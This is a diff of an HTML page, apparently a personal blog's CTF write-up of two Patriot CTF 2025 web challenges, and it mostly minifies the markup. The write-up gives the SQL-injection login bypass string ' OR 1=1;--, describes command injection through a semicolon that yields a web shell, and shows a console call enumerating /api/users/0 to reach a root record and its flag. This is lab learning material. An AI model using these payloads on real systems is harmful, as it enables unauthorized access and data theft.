@@ -1,152 +1,60 @@
-<!DOCTYPE html>
-<html lang="en">
-
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Patriot CTF 2025: Web Challenges · CTF Writeups</title>
-  <meta name="description" content="Writeups for Patriot CTF 2025&rsquo;s Connection Tester SQLi chain and Trust Fall IDOR/API issues." />
-  <link rel="stylesheet" href="/css/main.css" />
-</head>
-
-<body>
-  <header class="site-header">
-    <div class="container header-inner">
-      <a class="logo" href="/">CTF Writeups</a>
-      <nav>
-        <ul class="nav-list">
-          <li><a href="/posts/">Posts</a></li>
-          <li><a href="/tags/">Tags</a></li>
-        </ul>
-      </nav>
-    </div>
-  </header>
-  <main class="container">
-    
-<article class="post-single">
-  <header class="post-header">
-    <p class="meta">13 Dec 2025 • 3 min read</p>
-    <h1>Patriot CTF 2025: Web Challenges</h1>
-    <p class="lead">Writeups for Patriot CTF 2025&#39;s Connection Tester SQLi chain and Trust Fall IDOR/API issues.</p>
-  </header>
-
-  <div class="post-content">
-    <h1 id="challenge-connection-tester">Challenge: <code>Connection Tester</code></h1>
-<h2 id="analysis--exploit">Analysis &amp; Exploit</h2>
-<p>This is a classic <strong>SQLI (SQL Injection)</strong> challenge followed by a web shell.</p>
-<p><img src="/assets/Pasted%20image%2020251122030709.png" alt="Login page"></p>
-<p>First thing is this login page. The first that goes in mind is to try a blind SQLI for the fun.
-Running <code>' OR 1=1;--</code> as the username and just a fake password redirects as us an admin user! yay!</p>
-<p><img src="/assets/Pasted%20image%2020251122030851.png" alt="Connectivity tool panel"></p>
-<p>We are welcomed by this panel, not really interesting, but as a &lsquo;open connectivity tool&rsquo; button. Let&rsquo;s press it!</p>
-<p><img src="/assets/Pasted%20image%2020251122030925.png" alt="Connectivity tester form"></p>
-<p>This is the final page. It&rsquo;s supposed to be a tool that connects to an IP, but when entering any ip it just shows a static message.
-So, I tried fuzzing the input. Eventually, when entering a semicolon i finally saw another message:</p>
-<p><img src="/assets/Pasted%20image%2020251122031225.png" alt="Webshell response"></p>
-<p>A webshell! amazing.
-Let&rsquo;s try a simple ls and cat:</p>
-<p><img src="/assets/Pasted%20image%2020251122031302.png" alt="Flag output"></p>
-<p>Here&rsquo;s the flag! easy one.</p>
-<h1 id="challenge-trust-fall">Challenge: <code>Trust Fall</code></h1>
-<p>This is a classic <strong>IDOR (Insecure Direct Object Reference)</strong> challenge with a combination of <strong>Insecure Auth Missconfiguration</strong> and hidden API routes. For me, it was a common thing to fuzz around the website, as it should be.</p>
-<h2 id="analysis">Analysis</h2>
-<p>I was presented a login-page, with weird placeholders applied to the inputs:</p>
-<p><img src="/assets/Pasted%20image%2020251122032039.png" alt="Trust Fall login page"></p>
-<p>First thing I tried was trying these as the input, and as expected it worked!</p>
-<p>The rest of the challenge was easy, but confusing.
-The next source is applied to the website&rsquo;s html:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff7b72">const</span> AUTH_TOKEN <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#39;trustfall-readonly&#39;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff7b72">const</span> ... <span style="color:#ff7b72;font-weight:bold">=</span> ...;
-</span></span><span style="display:flex;"><span><span style="color:#ff7b72">const</span> ... <span style="color:#ff7b72;font-weight:bold">=</span> ...;
-</span></span><span style="display:flex;"><span><span style="color:#ff7b72">const</span> ... <span style="color:#ff7b72;font-weight:bold">=</span> ...;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff7b72">async</span> <span style="color:#ff7b72">function</span> fetchJson(url, options <span style="color:#ff7b72;font-weight:bold">=</span> {}) {
-</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">const</span> response <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">await</span> fetch(url, {
-</span></span><span style="display:flex;"><span>    credentials<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">&#39;same-origin&#39;</span>,
-</span></span><span style="display:flex;"><span>    ...options,
-</span></span><span style="display:flex;"><span>    headers<span style="color:#ff7b72;font-weight:bold">:</span> {
-</span></span><span style="display:flex;"><span>      ...(options.headers <span style="color:#ff7b72;font-weight:bold">||</span> {}),
-</span></span><span style="display:flex;"><span>      Authorization<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">`Bearer </span><span style="color:#a5d6ff">${</span>AUTH_TOKEN<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">`</span>
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>  });
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">if</span> (<span style="color:#ff7b72;font-weight:bold">!</span>response.ok) {
-</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">throw</span> <span style="color:#ff7b72">new</span> Error(<span style="color:#a5d6ff">`Request failed with status </span><span style="color:#a5d6ff">${</span>response.status<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">`</span>);
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">return</span> response.json();
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><h4 id="notes">Notes:</h4>
-<ul>
-<li><code>AUTH_TOKEN</code> is a constant that is used to authorize our request</li>
-<li>it&rsquo;s value is a readonly token, meaning we only have readonly perms (we cannot remove or update data by the rest api)</li>
-</ul>
-<p>Fuzzing the <code>AUTH_TOKEN</code> was the instant reaction for me, and so I tried editing it&rsquo;s value to <code>trustfall-admin</code>, <code>trustfall-readwrite</code>, <code>trustfall-administrator</code>, etc.. Having no positive response and only <strong>401 (Unauthorized)</strong>.</p>
-<p>Moving on, the website is requesting <code>/api/products</code> from the server, and also, it requests <code>/api/products/&lt;id&gt;</code>.
-Let&rsquo;s look at the <strong>JSON</strong> response:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[
-</span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>        <span style="color:#7ee787">&#34;sku&#34;</span>: <span style="color:#a5d6ff">&#34;GL-404&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#7ee787">&#34;name&#34;</span>: <span style="color:#a5d6ff">&#34;Ghostlight Lantern&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#7ee787">&#34;price&#34;</span>: <span style="color:#a5d6ff">59</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#7ee787">&#34;updatedBy&#34;</span>: <span style="color:#a5d6ff">1</span>
-</span></span><span style="display:flex;"><span>    },
-</span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>        <span style="color:#7ee787">&#34;sku&#34;</span>: <span style="color:#a5d6ff">&#34;MN-1337&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#7ee787">&#34;name&#34;</span>: <span style="color:#a5d6ff">&#34;Morning Nebula Mug&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#7ee787">&#34;price&#34;</span>: <span style="color:#a5d6ff">24.5</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#7ee787">&#34;updatedBy&#34;</span>: <span style="color:#a5d6ff">2</span>
-</span></span><span style="display:flex;"><span>    },
-</span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>        <span style="color:#7ee787">&#34;sku&#34;</span>: <span style="color:#a5d6ff">&#34;SB-001&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#7ee787">&#34;name&#34;</span>: <span style="color:#a5d6ff">&#34;Skybridge Backpack&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#7ee787">&#34;price&#34;</span>: <span style="color:#a5d6ff">129.99</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#7ee787">&#34;updatedBy&#34;</span>: <span style="color:#a5d6ff">1</span>
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>]
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Patriot CTF 2025: Web Challenges · Nitay's Portfolio</title><meta name=description content="Writeups for Patriot CTF 2025&rsquo;s Connection Tester SQLi chain and Trust Fall IDOR/API issues."><link rel=stylesheet href=/writeups/css/main.css></head><body><header class=site-header><div class="container header-inner"><a class=logo href=https://nitaystain.github.io/writeups/>Nitay's Portfolio</a><nav><ul class=nav-list><li><a href=/writeups/posts/>Posts</a></li><li><a href=/writeups/tags/>Tags</a></li></ul></nav></div></header><main class=container><article class=post-single><header class=post-header><p class=meta>13 Dec 2025 • 3 min read</p><h1>Patriot CTF 2025: Web Challenges</h1><p class=lead>Writeups for Patriot CTF 2025's Connection Tester SQLi chain and Trust Fall IDOR/API issues.</p></header><div class=post-content><h1 id=challenge-connection-tester>Challenge: <code>Connection Tester</code></h1><h2 id=analysis--exploit>Analysis & Exploit</h2><p>This is a classic <strong>SQLI (SQL Injection)</strong> challenge followed by a web shell.</p><p><img src=/writeups/assets/Pasted%20image%2020251122030709.png alt="Login page"></p><p>First thing is this login page. The first that goes in mind is to try a blind SQLI for the fun.
+Running <code>' OR 1=1;--</code> as the username and just a fake password redirects as us an admin user! yay!</p><p><img src=/writeups/assets/Pasted%20image%2020251122030851.png alt="Connectivity tool panel"></p><p>We are welcomed by this panel, not really interesting, but as a &lsquo;open connectivity tool&rsquo; button. Let&rsquo;s press it!</p><p><img src=/writeups/assets/Pasted%20image%2020251122030925.png alt="Connectivity tester form"></p><p>This is the final page. It&rsquo;s supposed to be a tool that connects to an IP, but when entering any ip it just shows a static message.
+So, I tried fuzzing the input. Eventually, when entering a semicolon i finally saw another message:</p><p><img src=/writeups/assets/Pasted%20image%2020251122031225.png alt="Webshell response"></p><p>A webshell! amazing.
+Let&rsquo;s try a simple ls and cat:</p><p><img src=/writeups/assets/Pasted%20image%2020251122031302.png alt="Flag output"></p><p>Here&rsquo;s the flag! easy one.</p><h1 id=challenge-trust-fall>Challenge: <code>Trust Fall</code></h1><p>This is a classic <strong>IDOR (Insecure Direct Object Reference)</strong> challenge with a combination of <strong>Insecure Auth Missconfiguration</strong> and hidden API routes. For me, it was a common thing to fuzz around the website, as it should be.</p><h2 id=analysis>Analysis</h2><p>I was presented a login-page, with weird placeholders applied to the inputs:</p><p><img src=/writeups/assets/Pasted%20image%2020251122032039.png alt="Trust Fall login page"></p><p>First thing I tried was trying these as the input, and as expected it worked!</p><p>The rest of the challenge was easy, but confusing.
+The next source is applied to the website&rsquo;s html:</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#ff7b72>const</span> AUTH_TOKEN <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>&#39;trustfall-readonly&#39;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72>const</span> ... <span style=color:#ff7b72;font-weight:700>=</span> ...;
+</span></span><span style=display:flex><span><span style=color:#ff7b72>const</span> ... <span style=color:#ff7b72;font-weight:700>=</span> ...;
+</span></span><span style=display:flex><span><span style=color:#ff7b72>const</span> ... <span style=color:#ff7b72;font-weight:700>=</span> ...;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72>async</span> <span style=color:#ff7b72>function</span> fetchJson(url, options <span style=color:#ff7b72;font-weight:700>=</span> {}) {
+</span></span><span style=display:flex><span>  <span style=color:#ff7b72>const</span> response <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#ff7b72>await</span> fetch(url, {
+</span></span><span style=display:flex><span>    credentials<span style=color:#ff7b72;font-weight:700>:</span> <span style=color:#a5d6ff>&#39;same-origin&#39;</span>,
+</span></span><span style=display:flex><span>    ...options,
+</span></span><span style=display:flex><span>    headers<span style=color:#ff7b72;font-weight:700>:</span> {
+</span></span><span style=display:flex><span>      ...(options.headers <span style=color:#ff7b72;font-weight:700>||</span> {}),
+</span></span><span style=display:flex><span>      Authorization<span style=color:#ff7b72;font-weight:700>:</span> <span style=color:#a5d6ff>`Bearer </span><span style=color:#a5d6ff>${</span>AUTH_TOKEN<span style=color:#a5d6ff>}</span><span style=color:#a5d6ff>`</span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  });
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#ff7b72>if</span> (<span style=color:#ff7b72;font-weight:700>!</span>response.ok) {
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>throw</span> <span style=color:#ff7b72>new</span> Error(<span style=color:#a5d6ff>`Request failed with status </span><span style=color:#a5d6ff>${</span>response.status<span style=color:#a5d6ff>}</span><span style=color:#a5d6ff>`</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#ff7b72>return</span> response.json();
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h4 id=notes>Notes:</h4><ul><li><code>AUTH_TOKEN</code> is a constant that is used to authorize our request</li><li>it&rsquo;s value is a readonly token, meaning we only have readonly perms (we cannot remove or update data by the rest api)</li></ul><p>Fuzzing the <code>AUTH_TOKEN</code> was the instant reaction for me, and so I tried editing it&rsquo;s value to <code>trustfall-admin</code>, <code>trustfall-readwrite</code>, <code>trustfall-administrator</code>, etc.. Having no positive response and only <strong>401 (Unauthorized)</strong>.</p><p>Moving on, the website is requesting <code>/api/products</code> from the server, and also, it requests <code>/api/products/&lt;id></code>.
+Let&rsquo;s look at the <strong>JSON</strong> response:</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>[
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        <span style=color:#7ee787>&#34;sku&#34;</span>: <span style=color:#a5d6ff>&#34;GL-404&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#7ee787>&#34;name&#34;</span>: <span style=color:#a5d6ff>&#34;Ghostlight Lantern&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#7ee787>&#34;price&#34;</span>: <span style=color:#a5d6ff>59</span>,
+</span></span><span style=display:flex><span>        <span style=color:#7ee787>&#34;updatedBy&#34;</span>: <span style=color:#a5d6ff>1</span>
+</span></span><span style=display:flex><span>    },
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        <span style=color:#7ee787>&#34;sku&#34;</span>: <span style=color:#a5d6ff>&#34;MN-1337&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#7ee787>&#34;name&#34;</span>: <span style=color:#a5d6ff>&#34;Morning Nebula Mug&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#7ee787>&#34;price&#34;</span>: <span style=color:#a5d6ff>24.5</span>,
+</span></span><span style=display:flex><span>        <span style=color:#7ee787>&#34;updatedBy&#34;</span>: <span style=color:#a5d6ff>2</span>
+</span></span><span style=display:flex><span>    },
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        <span style=color:#7ee787>&#34;sku&#34;</span>: <span style=color:#a5d6ff>&#34;SB-001&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#7ee787>&#34;name&#34;</span>: <span style=color:#a5d6ff>&#34;Skybridge Backpack&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#7ee787>&#34;price&#34;</span>: <span style=color:#a5d6ff>129.99</span>,
+</span></span><span style=display:flex><span>        <span style=color:#7ee787>&#34;updatedBy&#34;</span>: <span style=color:#a5d6ff>1</span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>]
 </span></span></code></pre></div><p><code>updatedBy</code> field is the interesting part! it shows the ID of the user who edited the product!
 Automatically I went on trying to find <code>/api/users</code>, which failed.
-But let&rsquo;s test <code>/api/users/1</code>:</p>
-<p><code>fetchJson(&quot;/api/users/1&quot;)</code> -&gt;</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#7ee787">&#34;id&#34;</span>:<span style="color:#a5d6ff">1</span>,<span style="color:#7ee787">&#34;username&#34;</span>:<span style="color:#a5d6ff">&#34;inventory-analyst&#34;</span>,<span style="color:#7ee787">&#34;role&#34;</span>:<span style="color:#a5d6ff">&#34;inventory&#34;</span>,<span style="color:#7ee787">&#34;flag&#34;</span>:<span style="color:#79c0ff">null</span>}
-</span></span></code></pre></div><p>Great! now let&rsquo;s try the other user:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#7ee787">&#34;id&#34;</span>:<span style="color:#a5d6ff">2</span>,<span style="color:#7ee787">&#34;username&#34;</span>:<span style="color:#a5d6ff">&#34;merchandising-bot&#34;</span>,<span style="color:#7ee787">&#34;role&#34;</span>:<span style="color:#a5d6ff">&#34;automation&#34;</span>,<span style="color:#7ee787">&#34;flag&#34;</span>:<span style="color:#79c0ff">null</span>}
-</span></span></code></pre></div><p>Oh, okay. Easy, let&rsquo;s try user <code>0</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#7ee787">&#34;id&#34;</span>: <span style="color:#a5d6ff">0</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#7ee787">&#34;username&#34;</span>: <span style="color:#a5d6ff">&#34;root&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#7ee787">&#34;role&#34;</span>: <span style="color:#a5d6ff">&#34;superuser&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#7ee787">&#34;flag&#34;</span>: <span style="color:#a5d6ff">&#34;PCTF{authz_misconfig_owns_u}&#34;</span>
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>We found the flag. Yippey!!!</p>
-<h2 id="exploit">Exploit</h2>
-<p>I was just using the given <code>fetchJson</code> function. So, running from the chrome console:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff7b72">const</span> req <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">await</span> fetchJson(<span style="color:#a5d6ff">&#39;/api/users/0&#39;</span>);
-</span></span><span style="display:flex;"><span>console.log(req); <span style="color:#8b949e;font-style:italic">// {id: 0, username: &#39;root&#39;, role: &#39;superuser&#39;, flag: &#39;PCTF{authz_misconfig_owns_u}&#39;}
-</span></span></span></code></pre></div>
-  </div>
-
-  <footer class="post-footer">
-    <div class="meta-group">
-      <span>Tags:</span>
-      <ul class="tag-list">
-        <li><a href="/tags/ctf/">#ctf</a></li>
-        <li><a href="/tags/web/">#web</a></li>
-      </ul>
-    </div>
-    <nav class="post-nav">
-      <a class="prev" href="/posts/null-ctf-2025-web-challenges/">← Null CTF 2025: Web Challenges</a>
-    </nav>
-  </footer>
-</article>
-
-  </main>
-  <footer class="site-footer">
-    <div class="container footer-inner">
-      <p>© 2025 Nitay · Built with Hugo</p>
-    </div>
-  </footer>
-</body>
-
-</html>
+But let&rsquo;s test <code>/api/users/1</code>:</p><p><code>fetchJson("/api/users/1")</code> -></p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{<span style=color:#7ee787>&#34;id&#34;</span>:<span style=color:#a5d6ff>1</span>,<span style=color:#7ee787>&#34;username&#34;</span>:<span style=color:#a5d6ff>&#34;inventory-analyst&#34;</span>,<span style=color:#7ee787>&#34;role&#34;</span>:<span style=color:#a5d6ff>&#34;inventory&#34;</span>,<span style=color:#7ee787>&#34;flag&#34;</span>:<span style=color:#79c0ff>null</span>}
+</span></span></code></pre></div><p>Great! now let&rsquo;s try the other user:</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{<span style=color:#7ee787>&#34;id&#34;</span>:<span style=color:#a5d6ff>2</span>,<span style=color:#7ee787>&#34;username&#34;</span>:<span style=color:#a5d6ff>&#34;merchandising-bot&#34;</span>,<span style=color:#7ee787>&#34;role&#34;</span>:<span style=color:#a5d6ff>&#34;automation&#34;</span>,<span style=color:#7ee787>&#34;flag&#34;</span>:<span style=color:#79c0ff>null</span>}
+</span></span></code></pre></div><p>Oh, okay. Easy, let&rsquo;s try user <code>0</code>:</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#7ee787>&#34;id&#34;</span>: <span style=color:#a5d6ff>0</span>,
+</span></span><span style=display:flex><span>    <span style=color:#7ee787>&#34;username&#34;</span>: <span style=color:#a5d6ff>&#34;root&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#7ee787>&#34;role&#34;</span>: <span style=color:#a5d6ff>&#34;superuser&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#7ee787>&#34;flag&#34;</span>: <span style=color:#a5d6ff>&#34;PCTF{authz_misconfig_owns_u}&#34;</span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>We found the flag. Yippey!!!</p><h2 id=exploit>Exploit</h2><p>I was just using the given <code>fetchJson</code> function. So, running from the chrome console:</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#ff7b72>const</span> req <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#ff7b72>await</span> fetchJson(<span style=color:#a5d6ff>&#39;/api/users/0&#39;</span>);
+</span></span><span style=display:flex><span>console.log(req); <span style=color:#8b949e;font-style:italic>// {id: 0, username: &#39;root&#39;, role: &#39;superuser&#39;, flag: &#39;PCTF{authz_misconfig_owns_u}&#39;}
+</span></span></span></code></pre></div></div><footer class=post-footer><div class=meta-group><span>Tags:</span><ul class=tag-list><li><a href=/tags/ctf/>#ctf</a></li><li><a href=/tags/web/>#web</a></li></ul></div><nav class=post-nav><a class=prev href=/writeups/posts/null-ctf-2025-web-challenges/>← Null CTF 2025: Web Challenges</a></nav></footer></article></main><footer class=site-footer><div class="container footer-inner"><p>© 2025 Nitay · Built with Hugo</p></div></footer></body></html>
